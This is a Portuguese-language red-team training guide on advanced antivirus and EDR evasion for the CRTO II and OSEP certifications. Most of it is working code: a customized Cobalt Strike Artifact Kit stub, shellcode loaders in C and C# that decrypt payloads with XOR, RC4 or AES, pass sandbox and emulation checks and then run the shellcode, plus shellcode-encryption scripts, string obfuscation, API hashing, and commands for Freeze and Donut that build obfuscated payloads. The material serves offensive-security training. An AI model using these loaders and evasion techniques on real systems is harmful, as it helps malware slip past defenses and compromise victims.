---
title: "AV Evasion — Advanced"
---

# Evasão de Antivírus — Técnicas Avançadas

## Do Defender ao SentinelOne: o Arsenal Técnico

Após entender como o antivírus funciona (ver `01_av_evasao_introducao.md`), o operador precisa dominar um conjunto de técnicas práticas para modificar, obfuscar e empacotar payloads de forma que passem pelas múltiplas camadas de detecção. No CRTO II e OSEP, o foco se desloca para payloads sofisticados que precisam funcionar contra EDRs maduros — não apenas Defender, mas CrowdStrike, SentinelOne e Carbon Black.

Esta seção cobre o arsenal técnico completo: desde customização do Artifact Kit do Cobalt Strike, passando por obfuscação de shellcode em C e C#, até a criação de custom loaders que descriptografam e executam shellcode em runtime sem deixar assinaturas conhecidas em disco.

---

## Customização Profunda do Payload

### Artifact Kit do Cobalt Strike

O Artifact Kit é o mecanismo do Cobalt Strike para customizar como os stubs (executáveis que carregam o beacon) são gerados. O kit fornece código-fonte C que pode ser modificado e recompilado para criar stubs únicos que não correspondem às assinaturas conhecidas do Cobalt Strike.

**O que o Artifact Kit fornece:**
- Templates em C para diferentes tipos de payload: EXE, DLL, serviço, shellcode
- Código que descriptografa e executa o beacon em tempo de execução
- Mecanismos de bypass de sandbox integráveis
- Sistema de compilação via script bash

**Estrutura do Artifact Kit:**
```
artifact-kit/
├── src/
│   ├── bypass-pipe.c        # Bypass via named pipe
│   ├── bypass-readfile.c    # Bypass via ReadFile
│   ├── bypass-template.c    # Template base
│   └── patch.py             # Script de patching
├── dist/
│   └── artifact.cna         # Aggressor script
└── build.sh                 # Script de compilação
```

**Customizando o stub em C:**

O arquivo `bypass-template.c` é o ponto de entrada. Modificações típicas:

```c
// bypass-custom.c — Stub customizado com descriptografia XOR

#include <windows.h>
#include <stdint.h>

// Chave XOR customizada (mude isso em cada engajamento)
#define XOR_KEY 0xDE

// Função de descriptografia em runtime
void decrypt_payload(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
        // Rotação adicional para dificultar análise estática
        data[i] = (data[i] << 3) | (data[i] >> 5);
    }
}

// Verificação de ambiente (anti-sandbox)
BOOL is_sandbox(void) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    // Menos de 2 processadores é suspeito
    if (si.dwNumberOfProcessors < 2) return TRUE;

    // Verificar memória RAM (sandboxes frequentemente têm menos de 2GB)
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) return TRUE;

    // Verificar uptime (sandbox raramente tem uptime longo)
    DWORD uptime = GetTickCount();
    if (uptime < 300000) { // menos de 5 minutos
        Sleep(15000); // Dormir 15 segundos para expirar timeout do emulador
        // Verificar se o tempo realmente passou
        if ((GetTickCount() - uptime) < 14000) return TRUE; // Emulador acelerou o tempo
    }

    return FALSE;
}

// Entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    if (is_sandbox()) return 0;

    // O payload será injetado aqui pelo build script
    // PAYLOAD_DATA e PAYLOAD_SIZE são substituídos em tempo de compilação
    unsigned char payload[] = { PAYLOAD_PLACEHOLDER };
    size_t payload_size = sizeof(payload);

    decrypt_payload(payload, payload_size, XOR_KEY);

    // Alocar memória executável
    LPVOID mem = VirtualAlloc(NULL, payload_size,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    if (!mem) return 1;

    // Copiar e executar
    memcpy(mem, payload, payload_size);
    ((void(*)())mem)();

    return 0;
}
```

**Compilar e aplicar ao Teamserver:**
```bash
# No diretório do Artifact Kit
cd /opt/cobaltstrike/artifact-kit

# Modificar src/bypass-custom.c com seu código

# Compilar (requer mingw-w64 instalado)
./build.sh

# O script gera os artefatos em dist/

# Carregar no Cobalt Strike via Aggressor Script
# No client CS: Script Manager -> Load -> artifact.cna
```

---

## Técnicas de Obfuscação de Shellcode

### XOR Simples (C)

XOR é a técnica mais básica mas ainda eficaz contra análise estática pura se a chave for suficientemente longa ou derivada dinamicamente.

```c
// xor_encrypt.c — Encriptador XOR com chave variável
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Criptografia XOR com chave multi-byte (mais difícil de detectar que XOR de byte único)
void xor_encrypt_decrypt(unsigned char *data, size_t data_len,
                          unsigned char *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// Loader em C que descriptografa e executa shellcode em runtime
#include <windows.h>

// Shellcode encriptado (bytes gerados externamente com xor_encrypt.c)
// Exemplo: shellcode Cobalt Strike beacon encriptado com chave "RedTeam2024!"
unsigned char encrypted_shellcode[] = {
    0xAB, 0xCD, 0xEF, 0x12, /* ... bytes encriptados aqui ... */
};
size_t shellcode_size = sizeof(encrypted_shellcode);

// Chave XOR — armazenada de forma fragmentada para dificultar análise estática
// Não como string literal única
unsigned char key_part1[] = { 0x52, 0x65, 0x64 };         // "Red"
unsigned char key_part2[] = { 0x54, 0x65, 0x61, 0x6D };   // "Team"
unsigned char key_part3[] = { 0x32, 0x30, 0x32, 0x34, 0x21 }; // "2024!"

// Montar chave em runtime (evita string literal detectável)
unsigned char* build_key(size_t *key_len) {
    *key_len = sizeof(key_part1) + sizeof(key_part2) + sizeof(key_part3);
    unsigned char *key = (unsigned char*)malloc(*key_len);
    memcpy(key, key_part1, sizeof(key_part1));
    memcpy(key + sizeof(key_part1), key_part2, sizeof(key_part2));
    memcpy(key + sizeof(key_part1) + sizeof(key_part2), key_part3, sizeof(key_part3));
    return key;
}

int main(void) {
    size_t key_len;
    unsigned char *key = build_key(&key_len);

    // Descriptografar in-place
    xor_encrypt_decrypt(encrypted_shellcode, shellcode_size, key, key_len);
    free(key);

    // Alocar memória com permissão RWX
    LPVOID exec_mem = VirtualAlloc(
        NULL,
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!exec_mem) {
        return 1;
    }

    // Copiar shellcode para memória executável
    memcpy(exec_mem, encrypted_shellcode, shellcode_size);

    // Limpar buffer original (higiene de memória)
    memset(encrypted_shellcode, 0, shellcode_size);

    // Criar thread para executar
    HANDLE hThread = CreateThread(
        NULL, 0,
        (LPTHREAD_START_ROUTINE)exec_mem,
        NULL, 0, NULL
    );

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}
```

**Script Python para gerar shellcode encriptado:**
```python
#!/usr/bin/env python3
# xor_encrypt_shellcode.py

import sys

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def bytes_to_c_array(data: bytes, var_name: str) -> str:
    hex_bytes = ', '.join(f'0x{b:02X}' for b in data)
    return f'unsigned char {var_name}[] = {{{hex_bytes}}};\n'

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f"Uso: {sys.argv[0]} <shellcode.bin> <chave>")
        sys.exit(1)

    with open(sys.argv[1], 'rb') as f:
        shellcode = f.read()

    key = sys.argv[2].encode()
    encrypted = xor_encrypt(shellcode, key)

    print(bytes_to_c_array(encrypted, 'encrypted_shellcode'))
    print(f'// Tamanho: {len(encrypted)} bytes')
    print(f'// Chave: {sys.argv[2]}')
```

### RC4 (C)

RC4 oferece obfuscação mais robusta que XOR simples e é relativamente simples de implementar sem dependências externas.

```c
// rc4_loader.c — Loader com descriptografia RC4

#include <windows.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

// Implementação RC4 pura em C (sem bibliotecas criptográficas — evita imports suspeitos)
typedef struct {
    uint8_t S[256];
    uint8_t i, j;
} RC4_CTX;

void rc4_init(RC4_CTX *ctx, const uint8_t *key, size_t key_len) {
    ctx->i = 0;
    ctx->j = 0;

    for (int i = 0; i < 256; i++) {
        ctx->S[i] = (uint8_t)i;
    }

    uint8_t j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % key_len]) % 256;
        // Swap
        uint8_t tmp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = tmp;
    }
}

void rc4_process(RC4_CTX *ctx, const uint8_t *input, uint8_t *output, size_t len) {
    for (size_t k = 0; k < len; k++) {
        ctx->i = (ctx->i + 1) % 256;
        ctx->j = (ctx->j + ctx->S[ctx->i]) % 256;

        // Swap
        uint8_t tmp = ctx->S[ctx->i];
        ctx->S[ctx->i] = ctx->S[ctx->j];
        ctx->S[ctx->j] = tmp;

        uint8_t keystream_byte = ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) % 256];
        output[k] = input[k] ^ keystream_byte;
    }
}

// Shellcode encriptado com RC4 (gerar externamente)
unsigned char enc_payload[] = {
    /* bytes encriptados */
    0x00 // placeholder
};
size_t enc_payload_len = sizeof(enc_payload);

// Chave RC4 — construída em runtime
unsigned char* get_rc4_key(size_t *key_len) {
    // Chave construída a partir de componentes separados
    // Dificulta detecção de string estática
    char k[] = {'S','e','c','r','e','t','K','3','y','!',0};
    *key_len = strlen(k);
    unsigned char *key = (unsigned char*)malloc(*key_len);
    memcpy(key, k, *key_len);
    // Ofuscar array 'k' em memória após uso
    memset(k, 0, sizeof(k));
    return key;
}

// Alocar memória executável sem usar VirtualAlloc diretamente (evitar import hashing trivial)
// Usar GetProcAddress para resolver APIs em runtime
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                        LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

int WinMainCRTStartup(void) {
    // Resolver APIs via GetProcAddress (evitar import table suspeita)
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

    pVirtualAlloc  fVirtualAlloc  = (pVirtualAlloc) GetProcAddress(hKernel32, "VirtualAlloc");
    pVirtualProtect fVirtualProtect = (pVirtualProtect) GetProcAddress(hKernel32, "VirtualProtect");
    pCreateThread  fCreateThread  = (pCreateThread) GetProcAddress(hKernel32, "CreateThread");

    // Obter chave RC4
    size_t key_len;
    unsigned char *key = get_rc4_key(&key_len);

    // Alocar buffer para payload descriptografado (inicialmente RW, não executável)
    LPVOID mem = fVirtualAlloc(NULL, enc_payload_len,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { free(key); return 1; }

    // Descriptografar para buffer RW
    RC4_CTX ctx;
    rc4_init(&ctx, key, key_len);
    rc4_process(&ctx, enc_payload, (uint8_t*)mem, enc_payload_len);

    // Limpar chave da memória
    free(key);
    memset(&ctx, 0, sizeof(ctx));

    // Mudar permissão para RX (sem write — mais stealth que RWX)
    DWORD old_protect;
    fVirtualProtect(mem, enc_payload_len, PAGE_EXECUTE_READ, &old_protect);

    // Executar
    HANDLE hThread = fCreateThread(NULL, 0,
                                    (LPTHREAD_START_ROUTINE)mem,
                                    NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}
```

### AES (C#)

Para payloads .NET e C#, AES oferece criptografia forte com suporte nativo da plataforma.

```csharp
// AesLoader.cs — Loader .NET com descriptografia AES-256

using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace StealthLoader {
    class Program {
        // APIs do Windows via P/Invoke
        // Nota: P/Invoke é detectável — considere usar DInvoke para ambientes com EDR avançado
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
                                           uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
                                          IntPtr lpStartAddress, IntPtr lpParameter,
                                          uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
                                           uint flNewProtect, out uint lpflOldProtect);

        // Constantes
        const uint MEM_COMMIT    = 0x1000;
        const uint MEM_RESERVE   = 0x2000;
        const uint PAGE_READWRITE        = 0x04;
        const uint PAGE_EXECUTE_READ     = 0x20;

        // Descriptografa shellcode usando AES-256-CBC
        static byte[] DecryptAES(byte[] ciphertext, byte[] key, byte[] iv) {
            using (Aes aes = Aes.Create()) {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.IV = iv;

                using (ICryptoTransform decryptor = aes.CreateDecryptor()) {
                    return decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
                }
            }
        }

        // Verificação de ambiente
        static bool IsSandbox() {
            // Verificar número de processadores
            if (Environment.ProcessorCount < 2) return true;

            // Verificar se usuário parece real (sandboxes frequentemente usam "user" ou "admin")
            string username = Environment.UserName.ToLower();
            if (username == "user" || username == "sandbox" ||
                username == "malware" || username == "test") return true;

            // Verificar tempo de boot do sistema
            long uptimeMs = Environment.TickCount64;
            if (uptimeMs < 300000) return true; // menos de 5 minutos de uptime

            return false;
        }

        static void Main(string[] args) {
            if (IsSandbox()) return;

            // Shellcode AES encriptado
            // Gerar com: python3 aes_encrypt.py shellcode.bin
            byte[] encryptedShellcode = new byte[] {
                // Bytes encriptados aqui — gerados por script Python externo
                0x00, 0x00 // placeholder
            };

            // Chave AES-256 (32 bytes) — construída em partes
            // Em produção: derivar de variáveis de ambiente ou condições do sistema
            byte[] keyPart1 = new byte[] { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48 };
            byte[] keyPart2 = new byte[] { 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50 };
            byte[] keyPart3 = new byte[] { 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58 };
            byte[] keyPart4 = new byte[] { 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60 };

            byte[] key = new byte[32];
            Buffer.BlockCopy(keyPart1, 0, key, 0,  8);
            Buffer.BlockCopy(keyPart2, 0, key, 8,  8);
            Buffer.BlockCopy(keyPart3, 0, key, 16, 8);
            Buffer.BlockCopy(keyPart4, 0, key, 24, 8);

            // IV AES (16 bytes)
            byte[] iv = new byte[] {
                0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
                0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
            };

            // Descriptografar
            byte[] shellcode = DecryptAES(encryptedShellcode, key, iv);

            // Limpar chave da memória (boas práticas de higiene)
            Array.Clear(key, 0, key.Length);
            Array.Clear(iv, 0, iv.Length);

            // Alocar memória RW inicialmente (não RWX — evita detecção óbvia)
            IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (mem == IntPtr.Zero) return;

            // Copiar shellcode para memória
            Marshal.Copy(shellcode, 0, mem, shellcode.Length);

            // Limpar shellcode descriptografado da memória gerenciada
            Array.Clear(shellcode, 0, shellcode.Length);

            // Mudar para RX (não RWX)
            uint oldProtect;
            VirtualProtect(mem, (uint)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);

            // Executar via thread
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

**Script Python para encriptar shellcode com AES:**
```python
#!/usr/bin/env python3
# aes_encrypt.py

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import sys

def encrypt_shellcode(shellcode_path: str, key: bytes, iv: bytes) -> bytes:
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(shellcode, AES.block_size))

def to_csharp_array(data: bytes) -> str:
    hex_bytes = ', '.join(f'0x{b:02X}' for b in data)
    return f'new byte[] {{ {hex_bytes} }}'

if __name__ == '__main__':
    # Chave e IV — devem corresponder ao loader C#
    key = bytes([0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,
                 0x49,0x4A,0x4B,0x4C,0x4D,0x4E,0x4F,0x50,
                 0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,
                 0x59,0x5A,0x5B,0x5C,0x5D,0x5E,0x5F,0x60])

    iv = bytes(range(16))  # 0x00 a 0x0F

    encrypted = encrypt_shellcode(sys.argv[1], key, iv)
    print(to_csharp_array(encrypted))
```

---

## Obfuscação de Strings em C

Strings literais em binários são altamente detectáveis por análise estática. A solução é construir strings em runtime.

```c
// string_obfuscation.c

#include <windows.h>
#include <string.h>

// Técnica 1: Split de string com concatenação em runtime
char* get_suspect_api_name(void) {
    // "VirtualAlloc" nunca aparece como string literal completa
    static char api_name[16];
    char part1[] = {'V','i','r','t','u','a','l',0};
    char part2[] = {'A','l','l','o','c',0};
    strcpy(api_name, part1);
    strcat(api_name, part2);
    return api_name;
}

// Técnica 2: XOR de strings em tempo de compilação (macro)
// Cada caractere é XORado com chave em tempo de compilação
// e descriptografado em runtime
#define XOR_CHAR(c, k) ((char)((c) ^ (k)))
#define KEY 0x55

// String "kernel32.dll" XORada com 0x55
// 'k'^0x55=0x3E, 'e'^0x55=0x30, 'r'^0x55=0x27, ...
const char enc_kernel32[] = {
    XOR_CHAR('k', KEY), XOR_CHAR('e', KEY), XOR_CHAR('r', KEY),
    XOR_CHAR('n', KEY), XOR_CHAR('e', KEY), XOR_CHAR('l', KEY),
    XOR_CHAR('3', KEY), XOR_CHAR('2', KEY), XOR_CHAR('.', KEY),
    XOR_CHAR('d', KEY), XOR_CHAR('l', KEY), XOR_CHAR('l', KEY),
    0
};

char* decrypt_string(const char *enc, size_t len, char key) {
    char *dec = (char*)malloc(len + 1);
    for (size_t i = 0; i < len; i++) {
        dec[i] = enc[i] ^ key;
    }
    dec[len] = 0;
    return dec;
}

// Técnica 3: Stack-based string construction
// String construída byte a byte na stack — nunca em memória global
HMODULE load_kernel32_stealth(void) {
    char dll_name[16];
    dll_name[0]  = 'k'; dll_name[1]  = 'e'; dll_name[2]  = 'r';
    dll_name[3]  = 'n'; dll_name[4]  = 'e'; dll_name[5]  = 'l';
    dll_name[6]  = '3'; dll_name[7]  = '2'; dll_name[8]  = '.';
    dll_name[9]  = 'd'; dll_name[10] = 'l'; dll_name[11] = 'l';
    dll_name[12] = '\0';
    return GetModuleHandleA(dll_name);
}
```

---

## Import Hashing / API Hashing

Em vez de importar APIs suspeitas diretamente (visíveis na Import Address Table), resolve-se o endereço das funções em runtime usando hash do nome.

```c
// api_hashing.c — Resolução de APIs por hash (técnica usada por Cobalt Strike, Metasploit)

#include <windows.h>
#include <winternl.h>
#include <stdint.h>

// Função de hash simples (djb2 modificado)
uint32_t hash_api_name(const char *name) {
    uint32_t hash = 0x811C9DC5; // FNV offset basis
    while (*name) {
        hash ^= (uint8_t)(*name++);
        hash *= 0x01000193; // FNV prime
    }
    return hash;
}

// Hashes pré-calculados (calculados offline, não strings visíveis no binário)
#define HASH_VIRTUALALLOC    0x91AFCA54  // hash de "VirtualAlloc"
#define HASH_CREATETHREAD    0x835E515E  // hash de "CreateThread"
#define HASH_VIRTUALPROTECT  0x7946C61B  // hash de "VirtualProtect"

// Resolver função por hash percorrendo a Export Table manualmente
void* resolve_by_hash(HMODULE hModule, uint32_t target_hash) {
    if (!hModule) return NULL;

    BYTE *base = (BYTE*)hModule;
    IMAGE_DOS_HEADER *dos_hdr = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS *nt_hdr = (IMAGE_NT_HEADERS*)(base + dos_hdr->e_lfanew);

    DWORD export_rva = nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!export_rva) return NULL;

    IMAGE_EXPORT_DIRECTORY *export_dir = (IMAGE_EXPORT_DIRECTORY*)(base + export_rva);

    DWORD *names = (DWORD*)(base + export_dir->AddressOfNames);
    WORD  *ordinals = (WORD*)(base + export_dir->AddressOfNameOrdinals);
    DWORD *functions = (DWORD*)(base + export_dir->AddressOfFunctions);

    for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
        const char *name = (const char*)(base + names[i]);
        if (hash_api_name(name) == target_hash) {
            WORD ordinal = ordinals[i];
            return (void*)(base + functions[ordinal]);
        }
    }
    return NULL;
}

// Uso:
void demo_api_hashing(void) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    // "kernel32.dll" ainda é necessária aqui — poderia usar o PEB para obter sem string

    typedef LPVOID (WINAPI *pVA)(LPVOID, SIZE_T, DWORD, DWORD);
    pVA fVirtualAlloc = (pVA)resolve_by_hash(hKernel32, HASH_VIRTUALALLOC);

    // Usar API resolvida sem importá-la diretamente
    if (fVirtualAlloc) {
        LPVOID mem = fVirtualAlloc(NULL, 4096, 0x3000, 0x40);
        // ...
    }
}
```

---

## Ferramentas: Freeze, Donut, pe2shellcode

### Freeze

Freeze é uma ferramenta que converte shellcode em executável ofuscado, com:
- Encriptação do shellcode
- Sleep mask (heap encryption durante sleep)
- Bypass de ETW (Event Tracing for Windows)
- Anti-sandbox

```bash
# Instalação
git clone https://github.com/optiv/Freeze
cd Freeze
go build -o Freeze .

# Uso básico — gerar EXE a partir de shellcode raw
./Freeze -I shellcode.bin -O payload.exe

# Com sleep de 5 segundos antes de execução (anti-sandbox)
./Freeze -I shellcode.bin -O payload.exe -sleep 5

# Injetar em processo legítimo existente
./Freeze -I shellcode.bin -O payload.exe -process "notepad.exe"

# Gerar DLL em vez de EXE
./Freeze -I shellcode.bin -O payload.dll -export DllMain

# Com ETW bypass ativado
./Freeze -I shellcode.bin -O payload.exe -ETW
```

### Donut

Donut converte executáveis PE, DLLs e assemblies .NET em shellcode que pode ser injetado em qualquer processo.

```bash
# Instalação
git clone https://github.com/TheWover/donut
cd donut && make

# Converter EXE para shellcode
./donut -f payload.exe -o shellcode.bin

# Converter DLL para shellcode (especificar export)
./donut -f payload.dll -e DllMain -o shellcode.bin

# Converter assembly .NET para shellcode
./donut -f payload.dll -c NameSpace.ClassName -m Main -o shellcode.bin

# Com parâmetros passados ao assembly
./donut -f Rubeus.exe -p "asktgt /user:admin" -o shellcode.bin

# Encriptar shellcode gerado (opção -e do donut)
./donut -f payload.exe -e 3 -o shellcode.bin  # AES128+CTR

# Especificar arquitetura
./donut -f payload.exe -a 2 -o shellcode.bin  # x64 apenas
```

### pe2shellcode

```bash
# Alternativa para converter PE em shellcode
git clone https://github.com/hasherezade/pe_to_shellcode
cd pe_to_shellcode && cmake . && make

# Converter
./pe2shc payload.exe shellcode.bin

# Injetar com inject.exe (ferramenta inclusa)
./run_pe shellcode.bin
```

---

## Técnicas de Anti-Emulação e Evasão Dinâmica

### Sleep com Verificação de Tempo Real

```c
// anti_emulation.c

#include <windows.h>
#include <stdint.h>

// Emuladores frequentemente aceleram o tempo ou têm timeout curto
// Esta técnica verifica se o sleep realmente ocorreu
BOOL sleep_and_verify(DWORD milliseconds) {
    DWORD start = GetTickCount();
    Sleep(milliseconds);
    DWORD elapsed = GetTickCount() - start;

    // Se menos de 75% do tempo passou, provável emulação
    if (elapsed < (milliseconds * 75 / 100)) {
        return FALSE; // Está em emulador
    }
    return TRUE; // Sleep real ocorreu
}

// Alternativa: usar timeBeginPeriod e medir com QueryPerformanceCounter
BOOL precise_sleep_verify(DWORD milliseconds) {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    Sleep(milliseconds);

    QueryPerformanceCounter(&end);
    double elapsed_ms = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart * 1000.0;

    return (elapsed_ms >= milliseconds * 0.8);
}
```

### Heap Encryption Durante Sleep (Sleep Mask)

Técnica avançada: encriptar o heap do processo durante períodos de sleep, impedindo que ferramentas de memória encontrem o beacon/payload em memória quando inativo.

```c
// sleep_mask.c — Implementação simplificada de heap encryption

#include <windows.h>
#include <heapapi.h>

// XOR todos os heaps alocados com uma chave durante o sleep
// Implementação real do Cobalt Strike Sleep Mask é mais complexa
void encrypt_heap_sleep(DWORD sleep_ms, uint8_t xor_key) {
    // Obter lista de heaps do processo
    HANDLE heaps[64];
    DWORD num_heaps = GetProcessHeaps(64, heaps);

    // Iterar e XOR conteúdo de cada heap
    for (DWORD i = 0; i < num_heaps; i++) {
        HeapLock(heaps[i]);
        // Na prática, iteraria pelas entradas do heap com HeapWalk
        // e XORaria cada bloco alocado
        HeapUnlock(heaps[i]);
    }

    // Dormir
    Sleep(sleep_ms);

    // Descriptografar (XOR novamente com mesma chave = descriptografia)
    for (DWORD i = 0; i < num_heaps; i++) {
        HeapLock(heaps[i]);
        // XOR reverso
        HeapUnlock(heaps[i]);
    }
}
```

---

## Detecção e OPSEC

### O Que Gera Alertas nos EDRs

**Sequência de chamadas suspeitas:**
```
VirtualAlloc(PAGE_EXECUTE_READWRITE) -> Cópia de bytes -> Execução
```
Todos os EDRs modernos têm regras específicas para essa sequência. A mitigação é usar `PAGE_READWRITE` na alocação e mudar para `PAGE_EXECUTE_READ` apenas antes de executar.

**Import table vazia:**
Um binário que não importa absolutamente nada é suspeito. Incluir imports legítimos:
```c
#pragma comment(lib, "user32.lib")
// Fazer uma chamada legítima a algo inócuo
MessageBoxA(NULL, "", "", MB_OK); // jamais chegará a ser chamado mas torna import real
```

**Entropia alta:**
Shellcode encriptado em binário causa alta entropia. Soluções:
- Codificar com Base64 (reduz entropia)
- Adicionar padding de dados de baixa entropia
- Armazenar payload criptografado em recurso PE separado

**Argumentos de linha de comando:**
Cobalt Strike, por padrão, usa argumentos que são assinados. Customizar via Malleable C2 profile.

### OPSEC Operacional

```
NUNCA:
- Usar payloads gerados diretamente pelo CS/MSF sem modificação
- Executar ThreatCheck ou DefenderCheck na máquina do cliente
- Testar payloads com cloud-delivered protection ativada

SEMPRE:
- Manter VM de desenvolvimento isolada
- Gerar nova chave de criptografia por engajamento
- Testar contra a versão mais recente do Defender antes do engajamento
- Usar donut + Freeze para payload final em vez de PE direto
- Compilar loaders a partir do código fonte, nunca usar binários pré-compilados
```

---

## Técnicas Avançadas de Ofuscação (MalTrak)

### Por Que Ofuscação em Múltiplas Camadas

AV/EDR modernos analisam:
- **Strings estáticas** no binário (IAT, literais de string hardcoded)
- **Comportamento dinâmico** (quais APIs são chamadas, em qual ordem)
- **Contexto de execução** (o processo faz algo legítimo antes de agir?)

Cada camada de ofuscação elimina um vetor de detecção. Combinar todas garante menor surface de assinatura.

---

### String Encryption em C++

Strings hardcoded (URLs de C2, nomes de processo, chaves de registro) aparecem no binário e são detectadas por scanners de string.

**Princípio**: Não armazenar strings em plaintext. Encriptar em tempo de compilação, decriptar em runtime apenas quando necessário.

**Implementação XOR com chave única:**

```cpp
// Assinatura da função de decrypt
void DecryptString(char* str, int length, char* buf, char key) {
    for (int i = 0; i < length; i++) {
        buf[i] = str[i] ^ key;
    }
    buf[length] = '\0';
}

// Uso — string encriptada em compilação, decriptada em runtime
int main() {
    // "cmd.exe" XOR 0x41 — pré-calculado com CyberChef
    char enc_cmd[] = { 0x22, 0x2C, 0x2D, 0x63, 0x38, 0x38 };
    char dec_buf[32] = {0};
    
    DecryptString(enc_cmd, sizeof(enc_cmd) - 1, dec_buf, 0x41);
    // dec_buf agora contém "cmd.exe"
    
    // Usar dec_buf, depois limpar
    SecureZeroMemory(dec_buf, sizeof(dec_buf));
    return 0;
}
```

**RC4 para strings maiores:**

```cpp
void RC4(char* key, unsigned char* data, int length) {
    unsigned char S[256];
    int i, j = 0;
    
    // KSA
    for (i = 0; i < 256; i++) S[i] = i;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % strlen(key)]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }
    
    // PRGA
    i = j = 0;
    for (int k = 0; k < length; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        data[k] ^= S[(S[i] + S[j]) % 256];
    }
}
```

**Workflow de pré-encriptação:**
1. Pegar string plaintext: `"MessageBoxA"`
2. Encriptar com CyberChef (XOR ou RC4 com chave escolhida)
3. Copiar bytes encriptados como array de chars no código
4. Em runtime: decriptar → usar → zerar memória

---

### API Name Encryption

**Problema**: Importações estáticas via IAT (`#include <windows.h>` + link direto) revelam todos os nomes de API no binário — analista vê imediatamente que o malware usa `VirtualAlloc`, `CreateRemoteThread`, `WriteProcessMemory`.

**Solução**: Não usar IAT para APIs sensíveis. Resolver em runtime via `LoadLibrary` + `GetProcAddress`, passando o nome da API encriptado.

**Padrão básico:**

```cpp
// Definir typedef da função
typedef int (WINAPI* MSGBOXDEF)(HWND, LPCSTR, LPCSTR, UINT);

int main() {
    // Nome da API encriptado com RC4
    unsigned char enc_api[] = { /* bytes encriptados de "MessageBoxA" */ };
    int api_len = sizeof(enc_api);
    
    // Decriptar nome da API em runtime
    char* api_name = (char*)RC4("1234", enc_api, api_len);
    
    // Resolver sem IAT estático
    MSGBOXDEF pMessageBox = (MSGBOXDEF)GetProcAddress(
        LoadLibrary("User32.dll"),
        api_name
    );
    
    // Usar a função
    pMessageBox(NULL, "Hello", "Test", MB_OK);
    
    // Limpar
    SecureZeroMemory(api_name, api_len);
    return 0;
}
```

